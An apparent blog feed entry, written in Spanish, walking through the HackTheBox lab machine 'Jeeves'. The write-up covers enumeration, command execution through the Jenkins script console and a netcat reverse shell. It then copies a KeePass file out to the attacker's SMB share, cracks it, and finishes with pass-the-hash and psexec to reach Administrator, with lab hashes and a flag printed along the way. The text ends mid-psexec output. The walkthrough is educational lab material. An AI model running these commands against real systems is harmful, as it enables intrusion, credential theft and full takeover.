<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-22T13:38:31-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Jeeves (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html" rel="alternate" type="text/html" title="HackTheBox - Jeeves (medium)" /><published>2024-06-22T00:00:00-06:00</published><updated>2024-06-22T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/709059a710d3d6ff1ba32bf0729ecbb8.png" />
</p>

<ul>
  <li>Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.63
PING 10.10.10.63 <span class="o">(</span>10.10.10.63<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.63: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>97.5 ms

<span class="nt">---</span> 10.10.10.63 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 97.478/97.478/97.478/0.000 ms
❯ whichSystem.py 10.10.10.63

10.10.10.63 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
</code></pre></div></div>

<h2 id="portscan">PortScan</h2>

<ul>
  <li><a href="https://github.com/MikeRega7/nrunscan">nrunscan</a> esta es la herramienta que hice que te automatiza el escaneo de <code class="language-plaintext highlighter-rouge">nmap</code> por <strong>TCP</strong> por si quieres usarla.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,445,50000 10.10.10.63 <span class="nt">-oN</span> targeted
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-02 17:38 CST
Nmap scan report <span class="k">for </span>10.10.10.63
Host is up <span class="o">(</span>0.096s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE    SERVICE      VERSION
80/tcp    open     http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open     msrpc        Microsoft Windows RPC
445/tcp   open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
50000/tcp filtered ibm-db2
Service Info: Host: JEEVES<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-time:
|   <span class="nb">date</span>: 2023-07-03T04:39:17
|_  start_date: 2023-07-03T03:49:32
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Bueno, el <code class="language-plaintext highlighter-rouge">crackmapexec</code> nos reporta que estamos ante un <strong>Windows 10 Pro</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.63
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos a comenzar enumerando por <code class="language-plaintext highlighter-rouge">smb</code> para ver si encontramos recursos compartidos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.63 <span class="nt">-N</span>
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Si comprobamos usando otras herramientas, vemos que no podemos enumerar por este puerto, ya que no tenemos credenciales y no podemos emplear un <strong>Null Session</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.63
<span class="o">[!]</span> Authentication error on 10.10.10.63
</code></pre></div></div>

<ul>
  <li>Vamos a ver las tecnologías que están corriendo en los puertos que tienen un servicio <code class="language-plaintext highlighter-rouge">http</code>.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.63</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.63</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.63</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Ask</span> <span class="no">Jeeves</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Pues bueno, vamos a ver la página web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web1.png" />
</p>

<ul>
  <li>Bueno es la primera vez que veo eso si investigamos vemos que es un <strong>buscador</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web2.png" />
</p>

<ul>
  <li>Bueno si investigamos de primeras si tiene vulnerabilidades como tal solo vemos una, pero no creo que este sea el caso, ya que esta máquina no contempla <strong>buffer overflow</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit jeeves
<span class="nt">----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                |  Path
<span class="nt">----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Ask.com/AskJeeves Toolbar Toolbar 4.0.2.53 - ActiveX Remote Buffer Overflow                   | windows/remote/4452.html
<span class="nt">----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div>

<ul>
  <li>Vamos a buscar algo en el navegador para probarlo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web3.png" />
</p>

<ul>
  <li>Pero bueno nos redirige a <code class="language-plaintext highlighter-rouge">error.html?</code> y bueno ya nos están dando información sobre el error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web4.png" />
</p>

<ul>
  <li>Vamos a comenzar aplicando <strong>Fuzzing</strong> para ver si encontramos más rutas de la máquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ feroxbuster <span class="nt">-t</span> 200 <span class="nt">-x</span> php,txt,html <span class="nt">-u</span> http://10.10.10.63

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ <span class="o">[</span>php, txt, html]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l        4w       50c http://10.10.10.63/error.html
200       17l       40w      503c http://10.10.10.63/index.html
200        1l        4w       50c http://10.10.10.63/Error.html
200       17l       40w      503c http://10.10.10.63/Index.html
<span class="o">[</span><span class="c">####################] - 1m    119996/119996  0s      found:4       errors:0</span>
<span class="o">[</span><span class="c">####################] - 1m    119996/119996  1741/s  http://10.10.10.63</span>
</code></pre></div></div>

<h2 id="enumeración-50000">Enumeración 50000</h2>

<ul>
  <li>
    <p>Bueno si analizamos el escaneo de <code class="language-plaintext highlighter-rouge">nmap</code> vemos que también está el puerto <code class="language-plaintext highlighter-rouge">50000</code> vamos a ver que hay, ya que nos dicen <strong>Service Info</strong>.</p>
  </li>
  <li>
    <p>Volví a escanear el puerto y si está abierto.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p50000</span> 10.10.10.63 <span class="nt">-oN</span> targe2
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-02 18:03 CST
Nmap scan report <span class="k">for </span>10.10.10.63
Host is up <span class="o">(</span>0.093s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
50000/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty<span class="o">(</span>9.4.z-SNAPSHOT<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>25.07 seconds
</code></pre></div></div>

<ul>
  <li>Esto es lo que hay.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web5.png" />
</p>

<ul>
  <li>Pero no encontramos nada vamos a aplicar <strong>Fuzzing</strong> pero ahora para este puerto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.63:50000 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 50 <span class="nt">-x</span> txt,php,html <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.10.63:50000
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 50
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              txt,php,html
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2023/07/02 18:07:16 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/askjeeves            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.63:50000/askjeeves/]
</code></pre></div></div>

<ul>
  <li>Y bueno nos redirige a un <strong>Jenkins</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web6.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web7.png" />
</p>

<ul>
  <li>Bueno vemos que esto está activado.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web8.png" />
</p>

<ul>
  <li>Bueno vemos que podemos ejecutar comandos en <strong>Groovy</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web9.png" />
</p>

<ul>
  <li>Si buscamos como podemos ejecutar algún comando encontramos lo siguiente.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web10.png" />
</p>

<ul>
  <li>Vamos a probarlo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web11.png" />
</p>

<ul>
  <li>Y bueno funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web12.png" />
</p>

<ul>
  <li>Bueno ahora lo que podemos hacer es asegurarnos de que si ganamos acceso al sistema ganar acceso ala máquina real y no a un contenedor para eso vamos a ejecutar el siguiente comando.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web13.png" />
</p>

<h2 id="shell-as-kohsuke">Shell as kohsuke</h2>

<ul>
  <li>Bueno para ganar acceso vamos a necesitar <code class="language-plaintext highlighter-rouge">nc.exe</code> si tienes <code class="language-plaintext highlighter-rouge">seclists</code> clonado o instalado ya te viene el <code class="language-plaintext highlighter-rouge">nc.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
❯ <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">smbserver.py</code> o <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> para ofrecer el <code class="language-plaintext highlighter-rouge">nc.exe</code> es importante que lo ejecutes en la ruta donde se encuentre el <strong>nc.exe</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Vamos a ponernos en escucha para directamente enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
Listening on 0.0.0.0 443
</code></pre></div></div>

<ul>
  <li>Y bueno vamos a escapar las barras para que no entre en conflicto vamos a darle a <strong>Execute</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web14.png" />
</p>

<ul>
  <li>Y ganamos acceso además tenemos un <strong>Hash</strong> <code class="language-plaintext highlighter-rouge">NTLMV2</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.63,49678<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>JEEVES<span class="se">\k</span>ohsuke,JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\k</span>ohsuke authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> kohsuke::JEEVES:aaaaaaaaaaaaaaaa:c23a012c38f0f7005de8ee2b9a5c45c4:010100000000000000f5b20e48add901859a5b91331600a700000000010010004c0058006f0072007a0078004c004b00030010004c0058006f0072007a0078004c004b00020010005a0042005700500078004c006c004400040010005a0042005700500078004c006c0044000700080000f5b20e48add90106000400020000000800300030000000000000000000000000300000ecd30e6e2741e888fe19c320d42d3424341eac95c921e6f32cf839ae34398fa60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003200000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:parrotsec<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.63 49679
Microsoft Windows <span class="o">[</span>Version 10.0.10586]
<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\.</span>jenkins&gt;
</code></pre></div></div>

<h2 id="usertxt">User.txt</h2>

<ul>
  <li>Si nos vamos ala <strong>raiz</strong> <code class="language-plaintext highlighter-rouge">C:\</code> vemos que hay está la <code class="language-plaintext highlighter-rouge">user.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> /r /s user.txt
 Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>esktop

11/03/2017  11:22 PM                32 user.txt
               1 File<span class="o">(</span>s<span class="o">)</span>             32 bytes

     Total Files Listed:
               1 File<span class="o">(</span>s<span class="o">)</span>             32 bytes
               0 Dir<span class="o">(</span>s<span class="o">)</span>   2,408,325,120 bytes free

C:<span class="se">\&gt;</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type </span>user.txt
e3232272596fb47950d59c4cf1e7066a
C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Si vamos un directorio hacia atrás vemos lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments

11/03/2017  11:18 PM    &lt;DIR&gt;          <span class="nb">.</span>
11/03/2017  11:18 PM    &lt;DIR&gt;          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File<span class="o">(</span>s<span class="o">)</span>          2,846 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,408,325,120 bytes free

C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Esto corresponde al <code class="language-plaintext highlighter-rouge">KeePass</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web15.png" />
</p>

<ul>
  <li>Vamos a traernos eso a nuestra máquina de atacante usando el recurso compartido a nivel de red con <code class="language-plaintext highlighter-rouge">smbclient.py</code> que ya tenemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy CEH.kdbx <span class="se">\\</span>10.10.14.12<span class="se">\p</span>arrotsec<span class="se">\C</span>EH.kdbx
        1 file<span class="o">(</span>s<span class="o">)</span> copied.

C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Y tenemos el archivo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">ls</span>
 CEH.kdbx   nc.exe
</code></pre></div></div>

<ul>
  <li>Vamos a abrirlo lo más probable es que necesitemos una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ keepassxc CEH.kdbx &amp; <span class="nb">disown</span>
<span class="o">[</span>1] 197209
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web16.png" />
</p>

<ul>
  <li>Como no sabemos la contraseña algo que podemos hacer es usar <code class="language-plaintext highlighter-rouge">keepass2john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ keepass2john CEH.kdbx <span class="o">&gt;</span> <span class="nb">hash</span>
❯ catn <span class="nb">hash
</span>CEH:<span class="nv">$keepass$*</span>2<span class="k">*</span>6000<span class="k">*</span>0<span class="k">*</span>1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d<span class="k">*</span>3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091<span class="k">*</span>393c97beafd8a820db9142a6a94f03f6<span class="k">*</span>b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff<span class="k">*</span>cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>KeePass <span class="o">[</span>SHA256 AES 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 6000 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>version<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
Cost 3 <span class="o">(</span>algorithm <span class="o">[</span><span class="nv">0</span><span class="o">=</span>AES, <span class="nv">1</span><span class="o">=</span>TwoFish, <span class="nv">2</span><span class="o">=</span>ChaCha]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
moonshine1       <span class="o">(</span>CEH<span class="o">)</span>
1g 0:00:01:27 DONE <span class="o">(</span>2023-07-02 19:14<span class="o">)</span> 0.01142g/s 628.1p/s 628.1c/s 628.1C/s mwuah..moonshine1
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<ul>
  <li>Ahora podemos usar el <code class="language-plaintext highlighter-rouge">keepassxc</code> para poder abrir el archivo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web17.png" />
</p>

<ul>
  <li>Y bueno vemos varias cosas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web18.png" />
</p>

<ul>
  <li>
    <p>Si hacemos un <code class="language-plaintext highlighter-rouge">ctrl+c</code> vemos que nos copea esto <code class="language-plaintext highlighter-rouge">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code>.</p>
  </li>
  <li>
    <p>Y bueno eso es un <code class="language-plaintext highlighter-rouge">hash</code> que podemos usar para aplicar <code class="language-plaintext highlighter-rouge">passthehash</code>.</p>
  </li>
  <li>
    <p>Vamos a validarlo con <code class="language-plaintext highlighter-rouge">crackmapexec</code> si es el del usuario <strong>Administrator</strong>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.63 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">':e0fb1fb85756c24235ff238cbe81fe00'</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span>+] Jeeves<span class="se">\A</span>dministrator::e0fb1fb85756c24235ff238cbe81fe00 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="shell-as-administrator">Shell as Administrator</h2>

<ul>
  <li>Pues bueno podemos conectarnos con el <code class="language-plaintext highlighter-rouge">hash nt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ psexec.py WORKGROUP/Administrator@10.10.10.63 <span class="nt">-hashes</span> :e0fb1fb85756c24235ff238cbe81fe00
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file LBvnmiYK.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service QTka on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service QTka.....
